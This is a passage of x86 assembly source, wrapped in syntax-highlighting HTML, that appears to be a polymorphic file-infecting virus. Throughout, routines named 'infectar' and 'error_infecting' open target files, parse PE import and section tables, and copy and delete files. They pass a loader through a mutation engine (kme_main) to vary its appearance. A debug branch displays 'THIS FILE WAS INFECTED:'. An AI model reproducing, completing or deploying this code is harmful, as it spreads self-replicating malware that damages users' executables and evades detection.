   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xor_hide</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">string_rnd_filez</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;  randomize 'tmp filez' created by loader</span><span class="sc0">

</span><span class="sc1">;maybe alloc memory and encrypt loader "here",</span><span class="sc0">
</span><span class="sc1">;pass control to poly, save flags, free memory</span><span class="sc0">
</span><span class="sc1">;restore flags and test for errors</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">loader@ini</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">loader_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">loader_size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">loader_size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_poly</span><span class="sc0">
   </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_infecting</span><span class="sc0">   </span><span class="sc1">;   </span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kme3_out_size</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@011</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">error_infecting</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@011</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kme3_out_size</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'N'</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@011</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cld</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'THIS FILE WAS INFECTED:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infectar@014</span><span class="sc0">

   </span><span class="sc5">it@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; ini IT ECX</span><span class="sc0">
   </span><span class="sc1">; end IT EDI</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">it@005</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">it@005</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">it@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@007</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">it@005</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@015</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">it@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert@001</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">it@005</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_lstrcmp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">it@004</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">it@005</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">it@002</span><span class="sc0">

   </span><span class="sc5">it@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@007</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">it@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_lstrcmp</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">

   </span><span class="sc5">_l1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_l2</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_l1</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc5">_l2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">convert@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">convert@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;   numero de secoes</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">convert@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;   inicio das secoes</span><span class="sc0">

   </span><span class="sc5">convert@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">convert@003</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">convert@002</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">convert@003</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

   </span><span class="sc5">convert@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">error_infecting</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@007</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_CopyFileA</span><span class="sc0">

   </span><span class="sc5">infectar@014</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalFree</span><span class="sc0">

   </span><span class="sc5">infectar@015</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@007</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_DeleteFileA</span><span class="sc0">

   </span><span class="sc5">infectar@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@019</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalFree</span><span class="sc0">

   </span><span class="sc5">infectar@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">w_IOB@001</span><span class="sc0">

   </span><span class="sc5">infectar@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_mutex@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_FindClose</span><span class="sc0">

   </span><span class="sc5">infectar@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">do_poly</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;  (loader_size * 10) + 1024</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalAlloc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_ionumb@013</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_poly_error</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FLAG_NOJMPS</span><span class="sc4">+</span><span class="sc5">FLAG_EIP0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CMD_ALL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CMD2_ALL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">REG_ALL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kme3_out_entry</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kme3_out_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;  loader_size * 8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">;   output offset</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc1">;   input eip</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  loader_size   ;   input size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  offset loader@ini</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">kme_main</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc5">do_poly_error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">stc</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">rnd_init</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetTickCount</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111111111b</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetTickCount</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">.r0</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.r0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">matrix</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">.r1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.r1</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">w_IO@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;   Open files with name in w_buffer@001</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">w_IO@003</span><span class="sc0">

   </span><span class="sc5">w_IO@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

   </span><span class="sc5">w_IO@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_buffer@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GetFileAttributesA</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@008</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
